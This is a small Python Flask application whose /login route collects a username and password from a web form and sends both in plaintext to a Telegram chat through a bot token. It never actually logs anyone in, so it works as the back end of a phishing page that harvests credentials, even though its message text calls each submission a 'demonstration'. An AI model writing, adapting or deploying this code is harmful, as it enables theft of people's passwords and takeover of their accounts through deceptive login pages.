import os
import requests
from flask import Flask, render_template, request, jsonify
from dotenv import load_dotenv

load_dotenv()

app = Flask(__name__)

BOT_TOKEN = os.getenv("BOT_TOKEN")
CHAT_ID = os.getenv("CHAT_ID")


def send_telegram(username, password):
    if not BOT_TOKEN or not CHAT_ID:
        raise RuntimeError("Telegram configuration missing")



    url = f"https://api.telegram.org/bot{BOT_TOKEN}/sendMessage"

    response = requests.post(
        url,
        data={
            "chat_id": CHAT_ID,
            "text": (
                "New demonstration login submission\n\n"
                f"Username: {username}\n"
                f"Password: {password}\n"
                "Status: Submitted"
            )
        },
        timeout=10
    )
    response.raise_for_status()


@app.route("/")
def home():
    return render_template("index.html")


@app.route("/login", methods=["POST"])
def login():
    username = request.form.get("username", "").strip()
    password = request.form.get("password", "")

    # if not username or not password:
    #     return jsonify({
    #     "success": False,
    #     "message": "Please enter both fields."
    # }), 400

    try:
        send_telegram(username, password)

        return jsonify({
            "success": True,
            "message": "Submission received successfully!"
        })

    except Exception:
        app.logger.exception("Telegram notification failed")
        return jsonify({
            "success": False,
            "message": "Notification failed. Check configuration."
        }), 500


if __name__ == "__main__":
    app.run(debug=False)
